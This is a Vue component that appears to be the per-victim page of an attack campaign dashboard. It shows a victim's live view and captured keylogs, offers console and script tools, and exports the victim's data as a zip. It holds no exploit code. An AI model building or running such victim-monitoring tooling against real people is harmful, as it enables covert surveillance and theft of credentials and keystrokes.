<script setup>
import { ref, computed, onMounted, onUnmounted, watch } from 'vue'
import { useRouter, useRoute } from 'vue-router'
import { useToast } from 'primevue/usetoast'
import { backendService } from '@/services/backend'
import Button from 'primevue/button'
import Breadcrumb from 'primevue/breadcrumb'

import VictimHeader from '@/components/dashboard/victim/VictimHeader.vue'
import LiveViewPanel from '@/components/dashboard/victim/tabs/LiveViewPanel.vue'
import KeylogPanel from '@/components/dashboard/victim/tabs/KeylogPanel.vue'
import TabbedTools from '@/components/dashboard/victim/TabbedTools.vue'
import { useDelayedIndicator } from '@/composables/useDelayedIndicator'
import DelayedContent from '@/components/default/DelayedContent.vue'

const router = useRouter()
const route = useRoute()
const toast = useToast()

// State
const campaign = ref(null)
const victim = ref(null)
const keylogs = ref("")
const keylogsTruncated = ref(false)
const keylogsOriginalSize = ref(0)
const loading = ref(true)
const showLoading = useDelayedIndicator(loading)
const refreshing = ref(false)
const error = ref(null)

// Computed
const victimId = computed(() => route.params.victimId)
const campaignId = computed(() => route.params.campaignId)

// Breadcrumb
const breadcrumbHome = { icon: 'pi pi-home', route: '/' }
const breadcrumbItems = computed(() => [
    { label: 'Campaigns', route: '/campaigns' },
    { label: campaign.value?.name || 'Campaign', route: `/campaigns/${campaignId.value}` },
    { label: victim.value?.id || 'Victim' }
])

async function fetchCampaign() {
    const response = await backendService.getCampaign(campaignId.value)
    if (!response) throw new Error('Campaign not found')
    campaign.value = response
}

async function fetchVictim() {
    const response = await backendService.getVictimDetails(campaignId.value, victimId.value)
    if (!response) throw new Error('Session not found')
    victim.value = response
}

async function fetchKeylogs() {
    try {
        const response = await backendService.getKeylogs(campaignId.value, victimId.value)
        keylogs.value = response.content
        keylogsTruncated.value = response.truncated
        keylogsOriginalSize.value = response.originalSize
    } catch (error) {
        console.error('Error fetching keylogs:', error)
    }
}

// Methods
async function loadData(initial = false) {
    if (loading.value && !initial) return
    if (refreshing.value) return

    if (initial) {
        loading.value = true
        error.value = null
    } else {
        refreshing.value = true
    }

    try {
        if (initial || !campaign.value) {
            await Promise.all([fetchCampaign(), fetchVictim()])
        } else {
            await fetchVictim()
        }
        await fetchKeylogs()
    } catch (err) {
        console.error('Failed to load data:', err)
        if (initial || !victim.value) {
            victim.value = null
            error.value = err.message || 'Failed to load session details'
        }
    } finally {
        if (initial) loading.value = false
        refreshing.value = false
    }
}

function goBack() {
    router.push({ name: 'campaign', params: { campaignId: campaignId.value } })
}

async function handleExport() {
    try {
        toast.add({
            severity: 'info',
            summary: 'Exporting...',
            detail: 'Zipping and downloading victim data...',
            life: 3000
        })

        await backendService.exportVictim(campaignId.value, victimId.value)

        toast.add({
            severity: 'success',
            summary: 'Success',
            detail: 'Data exported successfully',
            life: 3000
        })
    } catch (err) {
        toast.add({
            severity: 'error',
            summary: 'Export Failed',
            detail: err.message || 'Failed to export victim data',
            life: 5000
        })
    }
}

// Auto-refresh every 10s
let refreshInterval = null

onMounted(() => {
    loadData(true)

    refreshInterval = setInterval(() => {
        if (!loading.value && !document.hidden) {
            loadData(false)
        }
    }, 10000)
})

watch([campaignId, victimId], () => {
    campaign.value = null
    victim.value = null
    keylogs.value = ''
    keylogsTruncated.value = false
    keylogsOriginalSize.value = 0
    loadData(true)
})

onUnmounted(() => {
    if (refreshInterval) {
        clearInterval(refreshInterval)
    }
})
</script>

<template>
    <div class="victim-dashboard app-page">
        <DelayedContent :loading="loading" :show-indicator="showLoading">
        <!-- Breadcrumb -->
        <Breadcrumb
            :home="breadcrumbHome"
            :model="breadcrumbItems"
            class="dashboard-breadcrumb"
        >
            <template #item="{ item }">
                <router-link v-if="item.route" :to="item.route" class="breadcrumb-link">
                    {{ item.label }}
                </router-link>
                <span v-else>{{ item.label }}</span>
            </template>
        </Breadcrumb>

        <!-- Error State -->
        <div v-if="error" class="error-state">
            <i class="pi pi-exclamation-circle"></i>
            <h2>{{ error }}</h2>
            <div class="error-actions">
                <Button label="Try Again" icon="pi pi-refresh" @click="loadData(true)" />
                <Button label="Go Back" icon="pi pi-arrow-left" severity="secondary" outlined @click="goBack" />
            </div>
        </div>

        <!-- Victim Content -->
        <div v-else-if="victim && campaign" class="dashboard-content">
            <!-- Header -->
            <VictimHeader :victim="victim" :campaign="campaign" @back="goBack" @export="handleExport" />

            <!-- Main Split Panel: Live View (60%) + Keylog (40%) -->
            <div class="split-panel">
                <LiveViewPanel :victim="victim" :campaign="campaign" class="live-panel" />
                <KeylogPanel
                    :keylogs="keylogs"
                    :is-live="Boolean(victim.is_active)"
                    :truncated="keylogsTruncated"
                    :original-size="keylogsOriginalSize"
                    class="keylog-panel"
                />
            </div>

            <!-- Tabbed Tools (Console, Scripts, Gallery, Data) -->
            <TabbedTools :victim="victim" :campaign="campaign" />
        </div>
        </DelayedContent>
    </div>
</template>

<style scoped>
.victim-dashboard {
    padding: var(--page-padding);
    background-color: var(--color-background);
}

.victim-dashboard :deep(.p-button.p-button-outlined) {
    border-color: var(--primary);
}

.victim-dashboard :deep(.p-button.p-button-outlined:hover),
.victim-dashboard :deep(.p-button.p-button-outlined:focus-visible) {
    border-color: var(--primary-hover);
}

.dashboard-breadcrumb {
    margin-bottom: 1.5rem;
    background: transparent;
    border: none;
    padding: 0;
}

.breadcrumb-link {
    color: var(--color-text-mute);
    text-decoration: none;
    transition: color 0.2s;
}

.breadcrumb-link:hover {
    color: var(--color-accent);
}

.dashboard-content {
    display: flex;
    flex-direction: column;
    gap: 1.5rem;
}

/* Split Panel (60/40) */
.split-panel {
    display: grid;
    grid-template-columns: 60fr 40fr;
    gap: 1.5rem;
    min-height: 500px;
}

.live-panel {
    min-height: 500px;
}

.keylog-panel {
    min-height: 500px;
}

/* Error State */
.error-state {
    display: flex;
    flex-direction: column;
    align-items: center;
    justify-content: center;
    padding: 5rem 2rem;
    text-align: center;
    gap: 1rem;
}

.error-state i {
    font-size: 4rem;
    color: var(--color-text-mute);
}

.error-state h2 {
    font-size: 1.5rem;
    color: var(--color-heading);
    margin: 0;
}

.error-actions {
    display: flex;
    gap: 0.75rem;
}

/* Responsive */
@media (max-width: 1024px) {
    .split-panel {
        grid-template-columns: 1fr;
    }

    .keylog-panel {
        max-height: 400px;
    }
}

@media (max-width: 768px) {
    .victim-dashboard {
        padding: 1rem;
    }
}
</style>
